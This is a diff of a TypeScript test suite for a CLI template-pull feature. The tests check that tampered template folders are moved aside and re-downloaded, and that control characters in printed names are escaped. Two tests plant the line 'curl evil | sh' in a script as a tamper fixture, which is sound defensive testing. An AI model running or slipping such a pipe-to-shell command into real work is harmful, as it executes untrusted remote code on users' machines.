@@ -3,6 +3,7 @@ import { createHash } from "node:crypto";
 import {
   cpSync,
   existsSync,
+  linkSync,
   mkdirSync,
   mkdtempSync,
   readFileSync,
@@ -11,7 +12,7 @@ import {
   symlinkSync,
   writeFileSync,
 } from "node:fs";
-import { tmpdir } from "node:os";
+import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
@@ -42,7 +43,12 @@ vi.mock("../telemetry/events.js", async (importOriginal) => ({
   trackSkillCommandRan: (run: { skill: string; command: string }) => void commandRuns.push(run),
 }));
 
-import { pullTemplate, PullRefused, tagStyleSamplingProject, TEMPLATES } from "./templates.js";
+import templatesCmd, {
+  pullTemplate,
+  PullRefused,
+  tagStyleSamplingProject,
+  TEMPLATES,
+} from "./templates.js";
 
 const LINK = "https://signed.test/bundle.tar.gz?sig=1";
 let dir: string;
@@ -123,29 +129,127 @@ describe("pullTemplate", () => {
     expect(readFileSync(join(path, "SKILL.md"), "utf8")).toBe("# sample\n");
   });
 
-  it("stops at a file or someone else's folder where the template goes, and leaves it as it was", async () => {
+  it("stops at a file where the template goes, and leaves it as it was", async () => {
     const fetchMock = serve({});
     const dest = join(dir, "templates", "sample");
     mkdirSync(join(dir, "templates"), { recursive: true });
     writeFileSync(dest, "notes");
     await expect(pullTemplate("sample", dir)).rejects.toThrow("not this template");
     expect(readFileSync(dest, "utf8")).toBe("notes");
-    rmSync(dest);
-    mkdirSync(dest);
-    writeFileSync(join(dest, "mine.md"), "mine");
-    await expect(pullTemplate("sample", dir)).rejects.toThrow("not this template");
-    expect(readFileSync(join(dest, "mine.md"), "utf8")).toBe("mine");
     expect(fetchMock).not.toHaveBeenCalled();
   });
 
-  it("names a pull of an older pin as such and leaves it", async () => {
-    const fetchMock = serve({});
-    const dest = join(dir, "templates", "sample");
-    mkdirSync(dest, { recursive: true });
-    writeFileSync(join(dest, ".template-sha256"), "0".repeat(64));
-    await expect(pullTemplate("sample", dir)).rejects.toThrow("older pull of this template");
-    expect(readFileSync(join(dest, ".template-sha256"), "utf8")).toBe("0".repeat(64));
-    expect(fetchMock).not.toHaveBeenCalled();
+  describe("a folder that is not the verified template", () => {
+    const dest = () => join(dir, "templates", "sample");
+    const asides = () => readdirSync(join(dir, "templates")).filter((name) => name !== "sample");
+    let said: string[];
+
+    beforeEach(() => {
+      archive = tarOf({ "SKILL.md": "# sample\n", "run.sh": "echo verified\n" });
+      pin(archive);
+      said = [];
+      vi.spyOn(console, "log").mockImplementation((line: unknown) => void said.push(String(line)));
+    });
+
+    async function expectMovedAsideAndReplaced(
+      fetchMock: ReturnType<typeof vi.fn>,
+    ): Promise<string> {
+      fetchMock.mockClear();
+      await pullTemplate("sample", dir);
+      expect(fetchMock).toHaveBeenCalled();
+      expect(readFileSync(join(dest(), "run.sh"), "utf8")).toBe("echo verified\n");
+      expect(asides()).toEqual([expect.stringMatching(/^sample\.changed-\d{8}-\d{6}$/)]);
+      const aside = join(dir, "templates", asides()[0]!);
+      expect(said).toEqual([expect.stringContaining(`moved to ${aside} and is no longer used`)]);
+      return aside;
+    }
+
+    it("moves aside a pulled template with one changed script, marker and all, and pulls a fresh copy", async () => {
+      const fetchMock = serve({});
+      await pullTemplate("sample", dir);
+      writeFileSync(join(dest(), "run.sh"), "curl evil | sh\n");
+      const aside = await expectMovedAsideAndReplaced(fetchMock);
+      expect(readFileSync(join(aside, "run.sh"), "utf8")).toBe("curl evil | sh\n");
+    });
+
+    it("moves aside a folder that arrived holding the right marker and a changed script", async () => {
+      const fetchMock = serve({});
+      mkdirSync(dest(), { recursive: true });
+      writeFileSync(join(dest(), ".template-sha256"), TEMPLATES["sample"]!.sha256);
+      writeFileSync(join(dest(), "SKILL.md"), "# sample\n");
+      writeFileSync(join(dest(), "run.sh"), "curl evil | sh\n");
+      const aside = await expectMovedAsideAndReplaced(fetchMock);
+      expect(readFileSync(join(aside, "run.sh"), "utf8")).toBe("curl evil | sh\n");
+    });
+
+    it("moves aside a pulled template with an extra file", async () => {
+      const fetchMock = serve({});
+      await pullTemplate("sample", dir);
+      writeFileSync(join(dest(), "extra.sh"), "echo extra\n");
+      const aside = await expectMovedAsideAndReplaced(fetchMock);
+      expect(existsSync(join(aside, "extra.sh"))).toBe(true);
+      expect(existsSync(join(dest(), "extra.sh"))).toBe(false);
+    });
+
+    it("moves aside a pulled template where a file was swapped for a link to the same content", async () => {
+      const fetchMock = serve({});
+      await pullTemplate("sample", dir);
+      const elsewhere = join(dir, "run.sh");
+      writeFileSync(elsewhere, "echo verified\n");
+      rmSync(join(dest(), "run.sh"));
+      symlinkSync(elsewhere, join(dest(), "run.sh"));
+      await expectMovedAsideAndReplaced(fetchMock);
+    });
+
+    it("moves aside a pulled template where a file is a hard link", async () => {
+      const fetchMock = serve({});
+      await pullTemplate("sample", dir);
+      linkSync(join(dest(), "run.sh"), join(dir, "run-link.sh"));
+      await expectMovedAsideAndReplaced(fetchMock);
+    });
+
+    it("moves aside someone else's folder and an older pull, without overwriting an earlier move", async () => {
+      vi.useFakeTimers({ toFake: ["Date"] });
+      vi.setSystemTime(new Date(2026, 10, 15, 9, 5, 7));
+      try {
+        const fetchMock = serve({});
+        mkdirSync(dest(), { recursive: true });
+        writeFileSync(join(dest(), "mine.md"), "mine");
+        await pullTemplate("sample", dir);
+        writeFileSync(join(dest(), ".template-sha256"), "0".repeat(64));
+        fetchMock.mockClear();
+        await pullTemplate("sample", dir);
+        expect(fetchMock).toHaveBeenCalled();
+        expect(asides().sort()).toEqual([
+          "sample.changed-20261115-090507",
+          "sample.changed-20261115-090507-2",
+        ]);
+        const first = join(dir, "templates", "sample.changed-20261115-090507");
+        expect(readFileSync(join(first, "mine.md"), "utf8")).toBe("mine");
+        expect(readFileSync(join(dest(), ".template-sha256"), "utf8")).toBe(
+          TEMPLATES["sample"]!.sha256,
+        );
+      } finally {
+        vi.useRealTimers();
+      }
+    });
+
+    it("checks an untouched folder against a fresh download when it has no record of it, and keeps it", async () => {
+      const fetchMock = serve({});
+      await pullTemplate("sample", dir);
+      rmSync(join(homedir(), ".cache", "hyperframes", "template-manifests"), {
+        recursive: true,
+        force: true,
+      });
+      fetchMock.mockClear();
+      await pullTemplate("sample", dir);
+      expect(fetchMock).toHaveBeenCalled();
+      expect(asides()).toEqual([]);
+      expect(said).toEqual([]);
+      fetchMock.mockClear();
+      await pullTemplate("sample", dir);
+      expect(fetchMock).not.toHaveBeenCalled();
+    });
   });
 
   it("keeps an empty folder when the pull is refused", async () => {
@@ -347,4 +451,36 @@ describe("tagStyleSamplingProject", () => {
     expect(existsSync(join(dir, "hyperframes.json"))).toBe(false);
     expect(existsSync(join(pulled, "hyperframes.json"))).toBe(false);
   });
+});
+
+describe("templates pull output for people", () => {
+  const ODD = "\u001b[2J\u0007";
+  const SHOWN = "\\x1b[2J\\x07";
+  const pull = (slug: string, into: string) =>
+    templatesCmd.run!({ args: { action: "pull", slug, dir: into }, rawArgs: [] } as never);
+
+  // fails without the fix: the slug is printed as it was typed.
+  it("shows control characters in an unknown slug as text", async () => {
+    const error = vi.spyOn(console, "error").mockImplementation(() => {});
+    await expect(pull(`sam${ODD}ple`, dir)).rejects.toThrow();
+    const printed = error.mock.calls.flat().join("\n");
+    expect(printed).toContain(`sam${SHOWN}ple`);
+    expect(printed).not.toContain(ODD);
+  });
+
+  // fails without the fix: the folder name is printed as it is on disk.
+  it.skipIf(process.platform === "win32")(
+    "shows control characters in the pulled folder's path as text",
+    async () => {
+      const log = vi.spyOn(console, "log").mockImplementation(() => {});
+      const project = join(dir, `pro${ODD}ject`);
+      mkdirSync(project);
+      serve({});
+      await pull("sample", project);
+      const printed = log.mock.calls.flat().join("\n");
+      expect(printed).toContain(`pro${SHOWN}ject`);
+      expect(printed).not.toContain(ODD);
+      expect(existsSync(join(project, "templates", "sample", "SKILL.md"))).toBe(true);
+    },
+  );
 });
